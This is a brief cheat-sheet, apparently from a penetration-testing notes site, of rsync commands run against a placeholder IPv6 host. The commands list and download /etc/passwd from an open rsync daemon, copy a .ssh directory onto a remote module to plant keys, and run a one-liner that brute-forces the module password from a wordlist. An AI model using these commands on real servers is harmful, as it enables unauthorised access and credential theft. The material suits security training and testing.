---
title: "rsync"
date: 2024-7-12
tags: ["rsync"]
---

---
### Basic Commands

```bash
# List directory ('/') with ipv6
rsync --list-only -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/
``` 

```bash
# List a file with ipv6
rsync --list-only -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/etc/passwd
```

```bash
# List files (wildcard) with ipv6
rsync --list-only -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/etc/rsync*
```

```bash
# Get a file with ipv6
rsync -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/etc/passwd .
```

```bash
# Get files (wildcard) with ipv6
rsync -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/etc/rsync* .
```

```bash
# Copy files recusively to remote (With Creds)
export RSYNC_PASSWORD=password; rsync -aR .ssh/ rsync://user@[dead:beef::1234:5678:90ab:cdef]:8730/home_user/
```

### Bruteforce rsync password

```bash
# Check user from /etc/passwd, module from /etc/rsyncrsyncd.conf (e.g. user user and module home_user)
cat passwords.txt | while read password; do export RSYNC_PASSWORD=${password}; rsync --list-only rsync://user@[dead:beef::1234:5678:90ab:cdef]:8730/home_user 2>&1 | grep -q "auth failed on module home_user" || { echo "[+] Found: ${RSYNC_PASSWORD}"; break; } done
```

<br>